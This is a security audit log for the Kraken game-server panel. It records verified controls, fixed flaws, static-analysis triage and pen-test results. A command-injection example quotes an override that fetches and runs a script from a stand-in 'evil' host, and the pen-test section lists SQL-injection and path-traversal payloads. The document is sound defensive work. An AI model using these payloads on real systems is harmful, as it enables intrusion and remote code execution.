# Security Audit — 2026-06-24

Static review of the Kraken codebase (Go panel + agent, React UI) covering
authentication & credential handling, injection (SQL / command / path), transport
security, and authorization.

## Verified safe

- **Password storage** — argon2id (`internal/panel/auth/password.go`) with a
  `crypto/rand` 16-byte salt, PHC-encoded, verified with `subtle.ConstantTimeCompare`.
  Hashes are never stored in plaintext, never logged, and `User.PasswordHash` is
  `json:"-"` so it cannot serialize to clients. Login is timing-safe (dummy verify
  on unknown user) to resist user enumeration.
- **Session tokens** — 32 bytes from `crypto/rand`, opaque, URL-safe; sessions
  expire and are deleted on expiry. Stored as a **SHA-256 digest** at rest (see
  "Encryption at rest" below), so a database dump cannot be replayed as live sessions.
- **SQL** — every query in `internal/panel/store/postgres` is parameterized
  (`$1,$2,…`); no string-built SQL.
- **Path traversal** — the agent's `safePath()` (`internal/agent/docker.go`)
  cleans and prefix-checks against `/data`; `..`, absolute paths, and
  `/data/../x` escapes are all rejected post-`path.Clean`.
- **Delete shell command** — `DeletePaths` shell-quotes each (already-validated)
  path before `rm -rf`.
- **Transport** — Panel↔Agent uses mutual TLS with a pinned server name
  (`mtls.ClientTLS`); no `InsecureSkipVerify`. TLS 1.2 minimum.
- **SFTP server (2026-07-01)** — the Agent's SSH/SFTP server
  (`internal/agent/sftpserver.go`) uses **per-server credentials** (username = server
  id) and chroots each connection to that server's data dir via a rooted request
  handler: client paths are cleaned against `/` (so `..` can't climb out) then joined
  to the root — the same containment as `safePath` — and symlink creation is refused.
  Passwords are **bcrypt**-hashed by the Panel and pushed to the Agent (never plaintext);
  public keys are compared by marshaled bytes. The plaintext password is shown to the
  owner exactly once (on reset) and never stored. Credential material is stripped from
  general server API responses (`serverView`) and surfaced only via the owner-scoped
  SFTP endpoint. Host key is a persisted ed25519 key. _Operator note: expose the SFTP
  port (`:2022`) only to trusted networks / behind a firewall; it's an authenticated
  service but a new externally-reachable listener._

## Fixed this audit

### Command injection via user-editable variables (CWE-78) — HIGH

A user able to create a server and set "launch options" could inject arbitrary
shell commands. `Spec.ResolveVars` applied user overrides for user-editable
variables **without validation** (the per-variable `Rules` field was never
enforced anywhere), and the resolved values were substituted, unescaped, into the
install/startup command the agent runs via `/bin/sh -c`
(`handlers_server.go` → `spec.Render` → `docker.go` `Cmd: {script}`).

Example: a spec with `command: ./srv +map {{MAP}}` and a user override
`MAP = "de_dust2; curl http://evil/x | sh"` executes the attacker's command in
the container.

**Fix:** `Spec.ValidateVarOverrides` (`internal/shared/spec/render.go`) rejects
overrides of user-editable variables that contain shell metacharacters or control
characters; it is enforced at the input boundary in `handleCreateServer` (400 on
violation). Regression/exploit test: `internal/shared/spec/security_test.go`
(`TestVarOverrideCommandInjection`, `TestVarOverrideAllowsBenign`).

## Fixed in the follow-up pass (2026-06-25)

- **WebSocket origin** — `handlers_stream.go` no longer uses `["*"]`; it restricts
  cross-origin upgrades to `KRAKEN_ALLOWED_ORIGINS` (default localhost dev
  origins; same-origin always allowed).
- **Token out of the URL** — the stream WS now carries the session token in the
  `kraken.token` WebSocket subprotocol instead of a `?token=` query param, so it
  never lands in URLs, access logs, or browser history. (`streamToken`, and the
  frontend `useServerStream` subprotocol.)
- **Secure-by-default agent pool** — `api.New` derives the pool from config: mTLS
  when certs are present, insecure only with a loud warning. No more
  insecure-by-default footgun (`defaultNodePool`).
- **Bootstrap admin** — no weak default; when no password is configured, `Seed`
  generates a strong random one and logs it once.
- **Per-variable `Rules`** — now enforced in `ValidateVarOverrides` (int/float/
  bool/min/max/in) alongside the shell-metachar check (`validateRules`). Tests in
  `internal/shared/spec/security_test.go`.

## Static analysis sweep (2026-06-25)

Ran `go vet`, `govulncheck`, `gosec`, and `npm audit` over the backlog work.

- **`go vet`** — clean.
- **`npm audit`** (web, prod + dev) — **0 vulnerabilities**.
- **`govulncheck`** — 2 advisories (`GO-2026-4887`, `GO-2026-4883`), both in the
  pinned `github.com/docker/docker@v27.3.1+incompatible` Docker Engine SDK used by
  the Agent. **Fixed in: N/A** (no upstream fix available) and the SDK is
  version-pinned for build compatibility. **Accepted with monitoring:** reachable
  only from the Agent (which runs on trusted nodes and must talk to the local
  Docker daemon); re-evaluate when an upstream fix ships.
- **`gosec`** — 43 findings, triaged; no exploitable issues in our code:
  - **SSRF / path-traversal in `krakenctl`** (G703/G704) — taint from `os.Args`
    (`-panel`, `-out`); these are operator-supplied CLI arguments, not untrusted
    input. Not a vulnerability.
  - **Integer-overflow conversions** (G115) — bounded domains (ports 0–65535,
    memory in MB, argon2 params). No practical overflow.
  - **File reads by variable path** (G304) — config-supplied cert paths (mtls) and
    the backup store, which is guarded by a `filepath.Dir` prefix check against the
    server's backup dir. Safe.
  - **Decompression / form size** (G110/G120) — operate on the operator's own
    server data; uploads are already bounded by `io.LimitReader(maxUploadBytes)`.
  - **Cert file perms** (G306) — public certs at `0644`, **private keys at `0600`**
    (correct); consistent with `gen-certs`.
  - **Hardened:** backup directory creation tightened `0755`→`0750`
    (`internal/agent/backupstore.go`).

## Beta hardening pass (2026-06-25)

Re-ran static analysis + a live pen test of the Panel as the codebase grew
(bind-mount file subsystem, Windows support, WS streaming).

**Static analysis** — `go vet` clean; `staticcheck` clean; `npm audit` 0 vulns;
`govulncheck` = the 2 unfixable Docker-SDK advisories (accepted, agent-only, see
above). `gosec` 65 findings triaged → no exploitable issues: file-manager paths
(G304) are guarded by `safePath`; dir/file perms (G301/G306) are intentional so
bind-mounted containers can read their data; `filepath.WalkDir` TOCTOU (G122) is
over the agent's own managed dir; integer conversions (G115) are bounded; the
`krakenctl` SSRF/traversal (G703/G704) are operator-supplied CLI args.

**Fixed this pass:**
- **Spoofable client IP (staticcheck SA1019).** Removed `chi middleware.RealIP`,
  which trusts client `X-Forwarded-For`/`X-Real-IP`; `clientIP()` now uses the
  real TCP peer so audit-log source IPs can't be forged (no trusted proxy assumed).
- **Security headers.** Added `secureHeaders` middleware → `X-Content-Type-Options:
  nosniff` + `X-Frame-Options: DENY` on all responses.
- **Download filename.** `Content-Disposition` filename is sanitized
  (`sanitizeFilename`) so a crafted name can't break the header.

**Pen test (live Panel) — all passed:**
- Unauthenticated REST + WebSocket requests → 401; garbage/expired tokens → 401.
- Login: wrong password → 401; SQL-injection-style username → 401 (no 500).
- Path traversal (`../../etc/passwd`, `/etc`) on file endpoints → rejected
  ("path escapes /data").
- Command injection via launch variables → neutralized: shell metacharacters in
  real user-editable vars are rejected, and unknown override keys are dropped by
  `ResolveVars` (never stored or substituted — verified the created server's vars).
- Agent enrollment with a bad bootstrap token → 401.
- Responses carry the new security headers.

## Encryption at rest (2026-06-26)

Every secret the Panel persists to Postgres is now protected at rest. Master key
resolution (`config.ResolveSecretsKey`): `KRAKEN_SECRETS_KEY` (base64 of 32 bytes)
if set, else an auto-generated 32-byte key persisted to the config file
(`data/panel.json`, mode `0600`, **outside** the database it protects). A startup
warning is logged when the key was auto-generated, nudging operators to set
`KRAKEN_SECRETS_KEY` for production / multi-Panel deployments.

- **User passwords** — already argon2id (irreversible); unchanged. A hash is the
  correct at-rest form, so it is not additionally encrypted.
- **Session tokens** — hashed with SHA-256; only the digest is stored
  (`store.HashToken`), lookups hash the incoming bearer. A DB dump yields no usable
  tokens. (Pre-existing plaintext sessions stop validating after upgrade — users
  simply re-login.)
- **Reversible secrets** — the Cloudflare API token, UniFi API key, the Agent-
  enrollment **CA private key**, and each node's **SFTP backup credentials and
  Steam password** (per-node config: SFTP password, SFTP private key, Steam
  password) are sealed with **AES-256-GCM** (random nonce per value) before they
  touch the DB and decrypted on read (`internal/panel/secrets`). The CA
  *certificate* is public and stored in the clear; only the key is sealed. In a
  node's `node_config.data` JSONB only the credential fields are sealed —
  non-secret fields (target, host, paths, Steam username) stay readable so
  operators can inspect on-disk config. The Steam password is injected into the
  install container's env only at deploy time (for `RequiresSteamLogin` specs);
  the one-time Steam Guard code is transient and never persisted.
- **Game-server setting values — plaintext by design (accepted 2026-07-01).** A
  server's `settings`/`vars` (e.g. a game's in-game join password like
  `SERVER_PASSWORD`) are stored in the clear in the `servers.data` JSONB. They are
  low-sensitivity *game config* — rendered verbatim into the game's own config files
  — not infrastructure credentials, and the store layer is spec-agnostic (it can't
  tell which setting keys are `password`-typed without the spec). This matches
  Pelican/Pterodactyl, which store server variables in plaintext. Reviewed and
  **accepted as low-risk**; not encrypted.
- **Transparent migration** — ciphertext carries a marker (`enc:v1:` for strings,
  `ENC1` for byte blobs); values without the marker are treated as legacy plaintext
  and re-sealed on the next write, so upgrades need no data migration step.
- **Scope** — encryption is wired into the Postgres store only; the in-memory dev
  store holds secrets in RAM (never persisted). The Postgres **DSN** itself lives in
  `data/panel.json` (`0600`), not the DB, since it bootstraps the DB connection.

Verified end-to-end against a live Postgres
(`TestPostgresEncryptionAtRest`): raw `panel_settings.data` carries `enc:v1:`
ciphertext (no plaintext token/key substrings), `cluster_ca.key_pem` is `ENC1`-
sealed, and `sessions.token` holds the SHA-256 digest — each still round-trips
correctly through the store's read path. `TestPostgresNodeConfigEncryptionAtRest`
covers the per-node backup credentials the same way (sealed secrets, plaintext
non-secret fields). Unit round-trip + legacy-passthrough + wrong-key tests in
`internal/panel/secrets`.

## Release-prep static analysis (2026-07-01)

Full sweep before the release cut: `go build`, `go vet`, `staticcheck`, `deadcode`,
`gosec`, `govulncheck`.

- **`go build` / `go vet` / `staticcheck`** — all clean, zero findings.
- **`deadcode ./cmd/...`** — clean. Removed two now-unused symbols this pass:
  `DockerRuntime.backupTarget()` (`internal/agent/docker.go`) and the `WithNodePool`
  option (`internal/panel/api/server.go`, plus its stale doc comment).
- **`govulncheck`** — **5** advisories, **all** in the pinned
  `github.com/docker/docker@v27.3.1+incompatible` Engine SDK, **all `Fixed in: N/A`**
  (grew from 2 as upstream disclosed more; no upstream fix exists for any):
  - `GO-2026-5746` — archive endpoint (`PUT /containers/{id}/archive`) executes a
    container binary on the host.
  - `GO-2026-5668`, `GO-2026-5617` — `docker cp` race conditions (symlink swap →
    arbitrary empty file / bind-mount redirection to a host path).
  - `GO-2026-4887`, `GO-2026-4883` — pre-existing Docker-SDK advisories.

  **Reachability assessed — not exploitable through Kraken's call paths.** The three
  new CVEs are all about the container **file-copy / archive** API. Kraken never calls
  `CopyToContainer` / `CopyFromContainer` / the archive endpoint — confirmed by grep;
  the only Docker file-ish call is `ContainerExecCreate` (the player-query exec), and
  **all** Kraken file operations and backups are native Go (`internal/agent/fileops.go`)
  over host **bind mounts**, never `docker cp`. `govulncheck` flags the module because
  the SDK's `init` chains touch the vulnerable package, but the vulnerable *functions*
  are not on any Kraken code path. All five are also **daemon-side** and reachable only
  from the Agent, which runs on a trusted node and must talk to its local Docker daemon.
  **Accepted with monitoring**; re-evaluate when upstream ships fixes.
- **`gosec`** — 65 MEDIUM+ findings triaged; no exploitable issue in our code (baseline
  unchanged from the beta pass, plus a newer gosec ruleset adds theoretical rules):
  - **Goroutine uses `context.Background`** (G118, ×2) — `go s.provision(...)` and
    `go d.runBackup(...)` are long-lived background jobs that **must outlive** the HTTP
    request; a request-scoped context would cancel them mid-install/backup. Intentional.
  - **`filepath.WalkDir` TOCTOU** (G122, ×2) — tar-walk over the Agent's *own* managed
    data dir during backup. Operator-owned tree; not attacker-influenced.
  - **SSRF / traversal in `krakenctl`** (G703/G704) — taint from operator-supplied CLI
    args (`-panel`, `-out`); not untrusted input.
  - **Integer conversions** (G109/G115) — bounded domains (ports, counts, sizes). The
    Palworld-REST query port now also has an explicit upper bound (`pv <= 65535`,
    `handlers_server.go`).
  - **File reads by variable path** (G304) — the file-manager paths are guarded by
    `safePath`; cert paths are config-supplied.
  - **Dir/file perms** (G301/G306) — intentional so bind-mounted containers can read
    their data and public certs; **private keys are `0600`** (verified: `agent-key.pem`,
    the EC key, and the SFTP host key are all `0600`).
- **`npm audit`** (web) — see prior passes; unchanged.

## Release-prep live pen test (2026-07-01)

Live black-box + authed test of the running Panel (`:8080`) as part of the release
cut. Battery: auth bypass, token forgery, SQLi, path traversal, command injection,
object-scope/IDOR, malformed input, security headers, WS cross-origin.

**All passed except one low-severity robustness finding (patched, below):**
- Unauthenticated REST → **401** on every protected endpoint; garbage / empty /
  wrong-scheme tokens → 401.
- Login: wrong password → 401; SQLi-style usernames (`admin' OR '1'='1`, `admin'--`,
  `'; DROP TABLE users;--`) → **401, no 500** (queries are parameterized).
- Path traversal on file endpoints (`../../../../etc/passwd`, `/etc/passwd`,
  `/data/../../../etc/passwd`, URL-encoded variants) → **rejected** by the Agent's
  `safePath` ("escapes /data"); no host file served. (The Panel surfaces the Agent's
  refusal as `502`; the traversal is blocked either way.)
- Command injection via launch variables → **not exploitable**: the bundled specs
  expose no user-editable launch `variables` (settings render into config *files*,
  never the shell command), and `ValidateVarOverrides` rejects shell metacharacters on
  any spec that would add one (unit test `TestVarOverrideCommandInjection`). Unknown
  variable keys are dropped, not substituted.
- Object-scope: a random valid-but-nonexistent server id → **404** (404-on-denial, so
  existence isn't revealed); IDOR isolation covered by `TestServerOwnershipIsolation`.
- Security headers (`X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`) present.
- WebSocket upgrade with a foreign `Origin` → rejected (no 101).

### Fixed this pass

**Malformed id returned HTTP 500 (info-hygiene / robustness) — LOW.** Every `{id}`
path parameter is passed straight to Postgres, where the id columns are `uuid`. A
non-UUID id (e.g. `GET /api/v1/servers/not-a-uuid`, or a SQLi probe in the path)
made Postgres raise `22P02 invalid_text_representation`, which the store returned as a
generic error → the handler mapped it to **500** instead of 404. No data leak and auth
was still required, but a 500 on attacker-controlled input is poor hygiene and muddies
real-error monitoring.

_PoC (before):_ `curl -H "Authorization: Bearer <token>" http://localhost:8080/api/v1/servers/not-a-uuid` → `500`.

**Fix:** a `notFoundErr` helper in the Postgres store
(`internal/panel/store/postgres/postgres.go`) now treats `22P02` the same as
`pgx.ErrNoRows` — for a lookup by id, a malformed uuid is indistinguishable from a
missing row → `store.ErrNotFound` → **404**. Applied to all read and id-based
write/delete paths. Regression test: `TestPostgresMalformedIDIsNotFound`.
_After:_ same request → `404`; SQLi-in-path → `404`; no 500s in the Panel log.

## Open recommendations (not yet addressed)

- **Flat Agent certificate identity.** Every Agent cert carries the same logical
  identity (`CN`/SAN `kraken-agent`), which the Panel pins for all nodes — so Agent
  certs are mutually interchangeable, and the enrollment endpoint honors CSR-supplied
  SANs. This matches the original `gen-certs` design (not a regression from the new
  bootstrap flow) and is acceptable when all nodes are equally trusted. To support
  mixed-trust nodes, bind per-node identity into the issued cert and verify it when
  the Panel dials. (Code review 2026-06-25.)
- ~~**Object-level authorization (IDOR).**~~ **Fixed 2026-07-01.** Servers now carry
  an `OwnerID` (stamped from the creating user). Every server-scoped endpoint — get,
  list, power (both `/servers/{id}/power` and the node-scoped path), delete, files,
  backups, settings, DNS, port forwards, schedules, and the console/stats WS — checks
  ownership via `authorizeServer`/`mayAccessServer` (`internal/panel/api/middleware.go`)
  after loading the server. Access is granted to the owner or to a role holding the new
  **`server.any`** permission (Owner `*` / Admin `server.*` via wildcard; Operator and
  Read-only do **not** hold it, so they are scoped to servers they created). List is
  filtered to accessible servers; denied access returns **404** (not 403) so another
  user's server isn't revealed to exist. Servers created before ownership existed
  (empty `OwnerID`) are reachable only by `server.any` holders. Regression test:
  `TestServerOwnershipIsolation` (`internal/panel/api/authz_test.go`).
